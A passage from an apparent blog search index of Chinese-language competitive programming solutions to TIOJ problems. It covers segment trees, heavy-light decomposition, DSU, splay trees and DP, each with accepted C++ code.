_ {L+1}, \\dots, a_R$的絕對眾數，如果絕對眾數不存在請輸出-1。一個數字若為$T$個數字的絕對眾數，代表這個數字至少在$T$個數字中出現$\\lfloor \\frac{T+2}{2} \\rfloor$次。\n$1 \\leq N, Q \\leq 10^5$\n$1 \\leq L \\leq R \\leq N$\n$1 \\leq x \\leq N$\n$0 \\leq a_i, y \\leq 10^9$\n$1 \\leq k \\leq 10^9$\nSolution 打架線段樹的裸題\n對每個節點維護val和win，分別表示那個區間打贏的數字以及他贏了多少(?)\n合併的時候假如兩個區間的val一樣，那麼他們的win就會相加\n不同的話就是讓他們打架! win比較多的一方獲勝，但是必須減去對方的win\n詳細請看node operator+的部分\n一個區間的絕對眾數一定是打贏的數字，但是打贏的數字不一定是絕對眾數\n得到一個區間打贏的數字之後，我們得知道這個數字到底在這個區間出現幾次\n我們可以開rank tree對每個數字$x$紀錄$a_i=x$的index\n只要知道$l,r$在rank tree的名次就能知道$l, r$之間有多少數字是$x$\n至於區間除法就是暴力去做，如果該區間不全為$0$就遞迴計算直到葉節點\n每個葉節點最多就被暴力除$\\log C$次，每次暴力除最多影響另外$\\log N$個節點，還有rank tree的一個$\\log N$\n即使有單點更新，也只會貢獻$\\log C \\log N$的複雜度\n注意除以$1$不會讓$\\log C$次是好的，不過他不會影響答案所以請記得略過\n總複雜度大概是$\\mathcal{O}((N+Q) \\log N \\log C)$吧\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/stdc++.h\u0026gt; #include \u0026lt;ext/pb_ds/assoc_container.hpp\u0026gt; #include \u0026lt;ext/pb_ds/tree_policy.hpp\u0026gt; using namespace std; using namespace __gnu_pbds; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; const int N = 100025; unordered_map\u0026lt;int,rbt\u0026lt;int\u0026gt;\u0026gt; mp; struct zkw{ struct node { int val,win,isZero; node() : val(-1), win(0), isZero(0) {} node(int x) : val(x), win(1), isZero(x==0) {} inline friend node operator+(const node \u0026amp;a, const node \u0026amp;b) { node r; if(a.val == b.val) r.val=a.val, r.win=a.win+b.win; else if(a.win\u0026gt;b.win) r.val=a.val, r.win=a.win-b.win; else r.val=b.val, r.win=b.win-a.win; r.isZero = a.isZero\u0026amp;\u0026amp;b.isZero; return r; } friend void pr(const node \u0026amp;p) { cerr \u0026lt;\u0026lt; p.val \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; p.win \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } seg[N\u0026lt;\u0026lt;1]; int n; inline void init(int sz, int v[]) { n = sz; for(int i = 0; i \u0026lt; n; i++) seg[i+n] = node(v[i]), mp[v[i]].insert(i); for(int i = n-1; i \u0026gt;= 1; i--) seg[i] = seg[i\u0026lt;\u0026lt;1]+seg[i\u0026lt;\u0026lt;1|1]; } void pull(int p) { for(; p; p\u0026gt;\u0026gt;=1) seg[p\u0026gt;\u0026gt;1] = seg[p]+seg[p^1]; } inline void edit(int p, int k) { p+=n; mp[seg[p].val].erase(p-n); seg[p].val = k; seg[p].isZero = (seg[p].val == 0); mp[seg[p].val].insert(p-n); pull(p); } inline void brute(int i,int k) { if(seg[i].isZero) return; if(i \u0026lt; n) brute(i\u0026lt;\u0026lt;1,k), brute(i\u0026lt;\u0026lt;1|1,k), seg[i] = seg[i\u0026lt;\u0026lt;1]+seg[i\u0026lt;\u0026lt;1|1]; //else edit(i-n,seg[i].val/k); else { mp[seg[i].val].erase(i-n); seg[i].val /= k; seg[i].isZero = (seg[i].val == 0); mp[seg[i].val].insert(i-n); } } inline void div(int l,int r,int k) { int L = l, R = r; for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1, r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) brute(l++,k); if(r\u0026amp;1) brute(--r,k); } pull(L+n), pull(R-1+n); } inline int winner(int l,int r) { node res = node(); for(l+=n,r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1, r\u0026gt;\u0026gt;=1) { //debug(l), debug(r); if(l\u0026amp;1) res = res+seg[l++]; if(r\u0026amp;1) res = res+seg[--r]; } return res.val; } } sgt; int n,q,v[N]; signed main() { mp.reserve(N); mp.max_load_factor(0.25); ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q; for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; v[i]; sgt.init(n,v); for(int i = 0; i \u0026lt; q; i++) { int c,x,v,l,r; cin \u0026gt;\u0026gt; c; if(c == 1) { cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; v, --x; sgt.edit(x,v); }else if(c == 2) { cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r \u0026gt;\u0026gt; v, --l; if(v!=1) sgt.div(l,r,v); }else if(c == 3) { cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r, --l; v = sgt.winner(l,r); int cnt = mp[v].order_of_key(r) - mp[v].order_of_key(l); if(cnt \u0026gt; (r-l)/2) cout \u0026lt;\u0026lt; v \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else cout \u0026lt;\u0026lt; -1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/25/TIOJ-2140/","tags":["TIOJ","data-structure"],"title":"TIOJ-2140"},{"contents":"E.海賊王 https://tioj.ck.tp.edu.tw/problems/1102\nDescription 你是一位海賊，現在有$P$個敵人與$T$個寶藏等間距圍成一圓形\n你必須決定一個發射砲彈的方式\n砲彈會波及的範圍是圓形的，每次發射後範圍內的海賊會被殺死，寶藏也會被毀壞\n剩下的會重整隊形，同樣等間距圍成一圓形，且半徑不變（炮彈可以波及的半徑大於他們圍成的圈的半徑）\n檢查過船上的砲彈存量以後，你發現一次至少要炸死兩個敵方海賊（所以剩三個海賊的話一定要一次打死三個）\n你決定寫個程式幫你計算最多可以拿到多少未被毀壞的寶藏\nSolution 半徑根本就是垃圾資訊XDD\n只要炸的到的範圍比圍成的圈的範圍還要大，每次炸的就是環上的一段區間\n總之考慮海賊之間的間隙，本題等價於選取環上許多個不相鄰的間隙使得權重最大\n那麼顯然就直接DP，只要記得考慮環形的問題就好\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #include \u0026lt;bits/stdc++.h\u0026gt; #define debug(x) ((void)0) #endif // local #define all(v) begin(v),end(v) #define siz(v) (ll(v.size())) #define get_pos(v,x) (lower_bound(all(v),x)-begin(v)) #define sort_uni(v) sort(begin(v),end(v)),v.erase(unique(begin(v),end(v)),end(v)) #define pb emplace_back #define ff first #define ss second #define mem(v,x) memset(v,x,sizeof v) using namespace std; using namespace __gnu_pbds; typedef int64_t ll; typedef long double ld; typedef pair\u0026lt;ll,ll\u0026gt; pll; typedef pair\u0026lt;ld,ld\u0026gt; pld; template \u0026lt;typename T\u0026gt; using max_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,less\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using min_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,greater\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; constexpr ld PI = acos(-1), eps = 1e-11; constexpr ll N = 100025, INF = 1e18, MOD = 1000000007, K = 146, inf = 1e9; constexpr inline ll cdiv(ll x, ll m) { return x/m + ((x\u0026lt;0 ^ m\u0026gt;0) \u0026amp;\u0026amp; (x%m)); } // ceiling divide constexpr inline ll modpow(ll e,ll p,ll m=MOD) {ll r=1; for(e%=m;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r;} int r1, r2, n, L, p[N], v[N], dp[N][2], mx[N][2]; signed main() { ios_base::sync_with_stdio(0), cin.tie(0); while(cin \u0026gt;\u0026gt; r1 \u0026gt;\u0026gt; r2 \u0026gt;\u0026gt; n \u0026gt;\u0026gt; L, r1) { L += n; for(int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; p[i]; for(int i = 1; i \u0026lt; n; i++) v[i] = p[i]-p[i-1] - 1; v[n] = p[0]+L-p[n-1] - 1; dp[1][0] = mx[1][0] = 0; dp[1][1] = mx[1][1] = v[1]; int ans = 0; for(int i = 2; i \u0026lt;= n; i++) { dp[i][0] = mx[i-2][0] + v[i]; dp[i][1] = mx[i-2][1] + v[i]; mx[i][0] = max(mx[i-1][0], dp[i][0]); mx[i][1] = max(mx[i-1][1], dp[i][1]); ans = max(ans, dp[i][0]); if(i != n) ans = max(ans, dp[i][1]); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/25/TIOJ-1102/","tags":["TIOJ","dp"],"title":"TIOJ-1102"},{"contents":"Can You Arrive? https://tioj.ck.tp.edu.tw/problems/1798\nDescription 地鐵有$N$個站，$M$條軌道，$K$段行駛路線\n站與站之間使用軌道連接\n保證軌道不會形成環，且$M = N-1$\n每段行駛路線代表有一輛車在兩站之間的最短路徑來回發車\n也就是說這段路上的任意兩站都是互通的，可以直接抵達不需轉車\n現在$Q$位妹子來向你問路，問你能不能從某一站經過任意多次的轉車搭到另一站。\n保證兩站不是同一站。\n$K \\leq N \\leq 10^6, M = N-1, Q \\leq 10^6$\nSolution 每條行駛路線代表的就是在這條路徑上加值\n而查詢到不到得了就是查詢路徑上有沒有$0$\n可以採用輕重鏈剖分維護樹上路徑和\n因為修改都在詢問之前，所以利用前綴和就好，不需要開線段樹\n複雜度$\\mathcal{O}(N + Q \\log N)$\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 // __________________ // | ________________ | // || ____ || // || /\\ | || // || /__\\ | || // || / \\ |____ || // ||________________|| // |__________________| // \\###################\\ // \\###################\\ // \\ ____ \\ // \\_______\\___\\_______\\ // An AC a day keeps the doctor away. #pragma g++ optimize(\u0026#34;Ofast\u0026#34;) #pragma loop_opt(on) #include \u0026lt;bits/extc++.h\u0026gt; #ifdef local #define debug(x) (cerr\u0026lt;\u0026lt;#x\u0026lt;\u0026lt;\u0026#34; = \u0026#34;\u0026lt;\u0026lt;(x)\u0026lt;\u0026lt;\u0026#39;\\n\u0026#39;) #else #include \u0026lt;bits/stdc++.h\u0026gt; #define debug(x) ((void)0) #endif // local #define all(v) begin(v),end(v) #define siz(v) (ll(v.size())) #define get_pos(v,x) (lower_bound(all(v),x)-begin(v)) #define sort_uni(v) sort(begin(v),end(v)),v.erase(unique(begin(v),end(v)),end(v)) #define pb emplace_back #define ff first #define ss second #define mem(v,x) memset(v,x,sizeof v) using namespace std; using namespace __gnu_pbds; typedef int64_t ll; typedef long double ld; typedef pair\u0026lt;ll,ll\u0026gt; pll; typedef pair\u0026lt;ld,ld\u0026gt; pld; template \u0026lt;typename T\u0026gt; using max_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,less\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using min_heap = std::priority_queue\u0026lt;T,vector\u0026lt;T\u0026gt;,greater\u0026lt;T\u0026gt; \u0026gt;; template \u0026lt;typename T\u0026gt; using rbt = tree\u0026lt;T,null_type,less\u0026lt;T\u0026gt;,rb_tree_tag,tree_order_statistics_node_update\u0026gt;; constexpr ld PI = acos(-1), eps = 1e-11; constexpr ll N = 1000025, INF = 1e18, MOD = 1000000007, K = 146, inf = 1e9; constexpr inline ll cdiv(ll x, ll m) { return x/m + ((x\u0026lt;0 ^ m\u0026gt;0) \u0026amp;\u0026amp; (x%m)); } // ceiling divide constexpr inline ll modpow(ll e,ll p,ll m=MOD) {ll r=1; for(e%=m;p;p\u0026gt;\u0026gt;=1,e=e*e%m) if(p\u0026amp;1) r=r*e%m; return r;} int n, m, k, q; vector\u0026lt;int\u0026gt; g[N]; int sz[N], pa[N], mxs[N], top[N], dep[N], vis[N], cnt[N], tot; void dfs(int i, int p = 0) { sz[i] = 1, mxs[i] = 0, pa[i] = p, dep[i] = dep[p] + 1;; for(int j: g[i]) if(j != p) { dfs(j, i); sz[i] += sz[j]; if(sz[j] \u0026gt; sz[mxs[i]]) mxs[i] = j; } } void deco(int i, int t, int p = 0) { vis[i] = ++tot, top[i] = t if(mxs[i]) deco(mxs[i], t, i); for(int j: g[i]) if(j != p \u0026amp;\u0026amp; j != mxs[i]) deco(j, j, i); } void add(int a, int b) { //debug(\u0026#34;add\u0026#34;); while(top[a] != top[b]) { int ta = top[a], tb = top[b]; if(dep[ta] \u0026lt; dep[tb]) swap(a,b), swap(ta,tb); //debug(a), debug(b); ++cnt[vis[ta]], --cnt[vis[a]+1]; a = pa[ta]; //int sum[100] = {}; for(int i = 1; i \u0026lt;= n; i++) sum[i] = cnt[i]+sum[i-1]; for(int i = 1; i \u0026lt;= n; i++) cout \u0026lt;\u0026lt; !sum[vis[i]] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } if(a != b) { if(dep[a] \u0026lt; dep[b]) swap(a,b); //debug(a), debug(b); ++cnt[vis[b]+1], --cnt[vis[a]+1]; } } int query(int a, int b) { int res = 0; while(top[a] != top[b]) { int ta = top[a], tb = top[b]; if(dep[ta] \u0026lt; dep[tb]) swap(a,b), swap(ta,tb); res += cnt[vis[a]] - cnt[vis[ta]-1]; //debug(res); a = pa[ta]; } if(a != b) { if(dep[a] \u0026lt; dep[b]) swap(a,b); assert(vis[b] \u0026lt; vis[a]); res += cnt[vis[a]] - cnt[vis[b]]; } //debug(res); return res == 0; } signed main() { ios_base::sync_with_stdio(0), cin.tie(0); cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m \u0026gt;\u0026gt; k \u0026gt;\u0026gt; q; for(int i = 0, a, b; i \u0026lt; m; i++) { cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; g[a].pb(b), g[b].pb(a); } dfs(1); deco(1,1); while(k--) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; add(a,b); } for(int i = 1; i \u0026lt;= n; i++) cnt[i] += cnt[i-1]; for(int i = 1; i \u0026lt;= n; i++) cnt[i] = !cnt[i]; //for(int i = 1; i \u0026lt;= n; i++) cout \u0026lt;\u0026lt; top[i] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; //for(int i = 1; i \u0026lt;= n; i++) cout \u0026lt;\u0026lt; cnt[vis[i]] \u0026lt;\u0026lt; \u0026#39; \u0026#39;; cout \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; for(int i = 1; i \u0026lt;= n; i++) cnt[i] += cnt[i-1]; while(q--) { int a, b; cin \u0026gt;\u0026gt; a \u0026gt;\u0026gt; b; cout \u0026lt;\u0026lt; query(a, b) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/23/TIOJ-1798/","tags":["TIOJ","tree","data-structure"],"title":"TIOJ-1798"},{"contents":"聚集問題 https://tioj.ck.tp.edu.tw/problems/1129\nDescription 給定二維平面上$N$個點，若編號$i,j$的點之間的距離不大於$C$則他們之間有連邊\n問最後的連通塊數量以及每個連通塊的大小\nSolution 我想不到比$\\mathcal{O}(N^2)$枚舉直接連邊更好的解了XD\n比起DFS我更喜歡用DSU因此code是DSU\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026lt;cstdio\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;vector\u0026gt; const int N = 4001; int s, n, r; std::pair\u0026lt;int,int\u0026gt; p[N]; int pa[N], sz[N]; std::vector\u0026lt;int\u0026gt; ans; int dis(std::pair\u0026lt;int,int\u0026gt; a, std::pair\u0026lt;int,int\u0026gt; b) {return (a.first-b.first)*(a.first-b.first) + (a.second-b.second)*(a.second-b.second);} int anc(int x) {return x==pa[x]?x:pa[x]=anc(pa[x]);} void uni(int x, int y) { if((x=anc(x)) == (y=anc(y))) return; if(sz[x] \u0026lt; sz[y]) s=x, x=y, y=s; pa[y] = x, sz[x] += sz[y]; } signed main() { while(~scanf(\u0026#34;%d%d%d\u0026#34;, \u0026amp;s, \u0026amp;n, \u0026amp;r)) { p[0] = {s, s}; for(int i = 1; i \u0026lt;= n; i++) { p[i].first = (p[i-1].first*269+11)%103; p[i].second = (p[i-1].second*271+13)%97; pa[i] = i, sz[i] = 1; } sort(p+1, p+n+1); for(int i = 1; i \u0026lt;= n; i++) { for(int j = i+1; j \u0026lt;= n; j++) { if(p[j].first - p[i].first \u0026gt; r) break; if(dis(p[i],p[j]) \u0026lt;= r*r) uni(i, j); } } ans.clear(); for(int i = 1; i \u0026lt;= n; i++) if(pa[i] == i) ans.emplace_back(sz[i]); std::sort(ans.begin(), ans.end()); printf(\u0026#34;%d\\n\u0026#34;, int(ans.size())); for(int x: ans) printf(\u0026#34;%d \u0026#34;, x); puts(\u0026#34;\u0026#34;); } } ","permalink":"https://omeletwithoutegg.github.io/2020/02/23/TIOJ-1129/","tags":["TIOJ","dsu"],"title":"TIOJ-1129"},{"contents":"殿壬看蝴蝶 https://tioj.ck.tp.edu.tw/problems/2124\nDescription 太長了，略\nSolution 看到第五種操作就會想用平衡樹去寫這題\n然後仔細看看就會發現第八種操作其實和其他操作都沒什麼關係，只有第三、四種操作會改變以蝴蝶編號為順序的區間和\n所以呢對蝴蝶的編號開一個線段樹、對樹的編號開個Splay就能AC了\nSplay只需要實現查一個節點在中序是第個、查中序第k個節點是什麼，還有剪切區間\n至於區間和就隨便維護吧XD，code如下，我不知道該對裸題做甚麼解釋\n寫剪切區間的splay的時候要注意的可能就是不要改到空節點(我是用0代表空節點)的任何值\n也小心不要讓合併的時候合併到同一棵splay，出現環\n中途有一次一個回傳int的函數忘記回傳東西，在TIOJ上吃SF\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstdlib\u0026gt; const int N = 200025; int n, q, v[N]; struct SplayTree { struct node { int val, sz; int sum; int ch[2], pa; //bool rev; } S[N]; bool dir(int i) {return i==S[S[i].pa].ch[1];} /*void filp(int i) { int t = S[i].ch[0]; S[i].ch[0]=S[i].ch[1]; S[i].ch[1]=t; if(i) S[i].rev = !S[i].rev; } void push(int i) { if(S[i].rev) { flip(S[i].ch[0]); flip(S[i].ch[1]); S[i].rev = false; } } void pushdown(int i) { if(S[i].pa) pushdown(S[i].pa); push(i); }*/ void pull(int i) { S[i].sum = S[S[i].ch[0]].sum + S[i].val + S[S[i].ch[1]].sum; S[i].sz = S[S[i].ch[0]].sz + 1 + S[S[i].ch[1]].sz; } void rot(int x) { int y = S[x].pa, z = S[y].pa, d = dir(x); if(z) S[z].ch[dir(y)] = x; S[x].pa = z; S[y].ch[d] = S[x].ch[!d]; if(S[x].ch[!d]) S[S[x].ch[!d]].pa = y; S[x].ch[!d] = y; S[y].pa = x; pull(x), pull(y); } void splay(int x) { while(int y = S[x].pa) { if(S[y].pa) rot(dir(x)!=dir(y) ? x : y); rot(x); } } int kth(int k) { splay(1); //printf(\u0026#34;k = %d\\n\u0026#34;, k); for(int i = 1; i; ) { //printf(\u0026#34;i = %d\\n\u0026#34;, i); //system(\u0026#34;PAUSE\u0026#34;); int s = S[S[i].ch[0]].sz + 1; //printf(\u0026#34;%d\\n\u0026#34;, s); if(s == k) return splay(i), i; if(k \u0026lt; s) i = S[i].ch[0]; else i = S[i].ch[1], k -= s; } puts(\u0026#34;No such node\u0026#34;), exit(0); } int getrank(int i) { splay(i); return S[S[i].ch[0]].sz + 1; } int endpoint(int i, bool d) { for(splay(i); S[i].ch[d]; i = S[i].ch[d]); return splay(i), i; } int split(int i, bool d) { splay(i); int res = S[i].ch[d]; S[res].pa = S[i].ch[d] = 0, pull(i); return endpoint(res, !d); } void join(int a, int b) { splay(a), splay(b); if(!a || !b || S[a].pa || a == b) return; //printf(\u0026#34;a = %d b = %d\\n\u0026#34;, a, b); S[b].pa = a, S[a].ch[1] = b, pull(a); } int getsum(int l, int r) { // [l, r] int a = split(l, 0), b = split(r, 1); int res = S[r].sum; join(a, l), join(r, b); return res; } //#define debug(x) printf(#x \u0026#34; = %d\\n\u0026#34;, x); void jizz(int l1, int r1, int l2, int r2) { //printf(\u0026#34;IN\\n\u0026#34;); //debug(l1); debug(r1); int a1 = split(l1, 0), b1 = split(r1, 1); int a2 = split(l2, 0), b2 = split(r2, 1); //dbg(a1); dbg(b1); dbg(a2); dbg(b2); join(a1, l2), join(r2, b1); join(a2, l1), join(r1, b2); if(b1 == l2) join(r2, l1); //if(b2 == l1) join(r1, l2); //dbg(); //printf(\u0026#34;OUT\\n\u0026#34;); } void modify(int i, int d) { splay(i); S[i].val = d; pull(i); } void init(int n, int v[]) { for(int i = 1; i \u0026lt;= n; i++) S[i].sz = 1, S[i].val = S[i].sum = v[i]; for(int i = 1; i \u0026lt;= n-1; i++) { splay(i); S[i].ch[1] = i+1, S[i+1].pa = i; pull(i); } /* std::function\u0026lt;int(int,int)\u0026gt; build = [\u0026amp;](int l, int r) { if(l \u0026gt; r) return 0; if(l == r) return l; int m = (l+r)/2; int L = build(l, m-1), R = build(m+1, r); S[m].ch[0] = L, S[m].ch[1] = R, S[L].pa = S[R].pa = m, pull(m); return m; }; build(1, n); */ } void dfs(int i) { if(!i) return; dfs(S[i].ch[0]); printf(\u0026#34;%d \u0026#34;, i); dfs(S[i].ch[1]); } void dbg(int i = 1) { printf(\u0026#34;SPLAY %d: \u0026#34;, i); splay(i); dfs(i); puts(\u0026#34;\u0026#34;); } } sp; struct segtree { int n; int sum[N\u0026lt;\u0026lt;1]; void init(int _n, int v[]) { n = _n; for(int i = 0; i \u0026lt; n; i++) sum[i+n] = v[i]; for(int i = n-1; i \u0026gt; 0; i--) sum[i] = sum[i\u0026lt;\u0026lt;1]+sum[i\u0026lt;\u0026lt;1|1]; } void modify(int p, int d) { for(sum[p+=n] = d; p \u0026gt; 1; p \u0026gt;\u0026gt;= 1) sum[p\u0026gt;\u0026gt;1] = sum[p]+sum[p^1]; } int query(int l, int r) { // [l, r) 0 base int res = 0; for(l+=n, r+=n; l\u0026lt;r; l\u0026gt;\u0026gt;=1, r\u0026gt;\u0026gt;=1) { if(l\u0026amp;1) res += sum[l++]; if(r\u0026amp;1) res += sum[--r]; } return res; } } sgt; signed main() { scanf(\u0026#34;%d%d\\n\u0026#34;, \u0026amp;n, \u0026amp;q); for(int i = 1; i \u0026lt;= n; i++) scanf(\u0026#34;%d\u0026#34;, v+i); sp.init(n, v); sgt.init(n+1, v); while(q--) { int t; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); if(t == 1) { int i, j; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;i, \u0026amp;j); sp.jizz(i,i,j,j); }else if(t == 2) { int i, j; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;i, \u0026amp;j); i = sp.kth(i), j = sp.kth(j); sp.jizz(i,i,j,j); }else if(t == 3) { int i, d; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;i, \u0026amp;d); sp.modify(i, d); sgt.modify(i, d); }else if(t == 4) { int i, d; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;i, \u0026amp;d); i = sp.kth(i); sp.modify(i, d); sgt.modify(i, d); }else if(t == 5) { int l1, r1, l2, r2; scanf(\u0026#34;%d%d%d%d\u0026#34;, \u0026amp;l1, \u0026amp;r1, \u0026amp;l2, \u0026amp;r2); l1 = sp.kth(l1), r1 = sp.kth(r1), l2 = sp.kth(l2), r2 = sp.kth(r2); sp.jizz(l1, r1, l2, r2); }else if(t == 6) { int i; scanf(\u0026#34;%d\u0026#34;, \u0026amp;i); printf(\u0026#34;%d\\n\u0026#34;, sp.kth(i)); }else if(t == 7) { int i; scanf(\u0026#34;%d\u0026#34;, \u0026amp;i); printf(\u0026#34;%d\\n\u0026#34;, sp.getrank(i)); }else if(t == 8) { int l, r; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;l, \u0026amp;r); printf(\u0026#34;%d\\n\u0026#34;, sgt.query(l, r+1)); }else if(t == 9) { int l, r; scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;l, \u0026amp;r); l = sp.kth(l), r = sp.kth(r); printf(\u0026#34;%d\\n\u0026#34;, sp.getsum(l, r)); } //sp.dbg(); } return 0; } ","permalink":"https://omeletwithoutegg.github.io/2020/02/22/TIOJ-2124/","tags":["TIOJ","data-structure","splay-tree"],"title":"TIOJ-2124"},{"contents":"【IOI2015】Boxes 一堆盒子 https://tioj.ck.tp.edu.tw/problems/1884\nDescription 有$L$個地區排成一環狀，依序編號為$0, 1, \\dots, L-1$\n從任何一個地區移動到相鄰的地區所需要的時間均為一單位時間\n現在有$N$個人需要寄送貨物，他們分別住在編號為$p_1, p_2, \\dots, p_n$的地區(已經依非遞減順序排序)\n貨物中心位在編號$0$的地區，並且郵差每次只能帶至多$K$件貨物移動\n(世界上只有一個郵差\u0026hellip;真辛苦)\n身上所有的貨物都送到後，必須回到$0$號地區，才能進行下一輪的送貨\n你的任務就是幫送貨的郵差計算他最少要花多少時間\n才能從貨物中心出發，寄送完所有貨物，最後再回到貨物中心\n(其中可能會回貨物中心很多次以補充貨物)\n$\n1 \\leq K \\leq N \\leq 10^7,\n1 \\leq L \\leq 10^9,\n0 \\leq p_i \u0026lt; L\n$\nSolution 首先有$K=1$的Subtask，可以確定自己對題意的理解\n可以發現題目就是要把這$N$個點分成很多堆，每堆不超過$K$個，使得總成本最小\n一個關鍵的觀察是分的方式肯定是排序過後切成很多連續區間\n不需要考慮$i \u0026lt; x \u0026lt; j$但$x$卻不和$i,j$同一堆的情形，否則可以想辦法交換一下使得答案不會變更差\n至此可以列出DP式\n$$\ndp[i] = \\min\\limits _ {\\max(0, i-k) \\leq j \u0026lt; i} { dp[j] + cost(j+1, i) }\n$$\n其中$cost(l, r) = \\min {L, 2p_r, 2(L-p_l)}$\n代表從$0$號節點開始經過$p_l, p _ {l+1}, \\dots, p_r$再回到$0$號節點所需要的最少時間\n複雜度$\\mathcal{O}(NK)$\n令$a_i = \\min(L, 2p_i), b_i = 2(L-p _ {i+1})$\n$$\ndp[i] = \\min {dp[j] + \\min(a_i, b_j)} = \\min(\\min{dp[j]}+a_i, \\min {dp[j]+b_j});\n$$\n利用單調隊列優化可以快速求得$dp[j]$和$dp[j]+b_j$的最小值，最後的複雜度是$\\mathcal{O}(N)$\nAC code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026lt;bits/stdc++.h\u0026gt; #define ff first #define ss second #define pb emplace_back using namespace std; typedef int64_t ll; const int N = 10000025; int n, k, L; int p[N]; ll solve() { cin 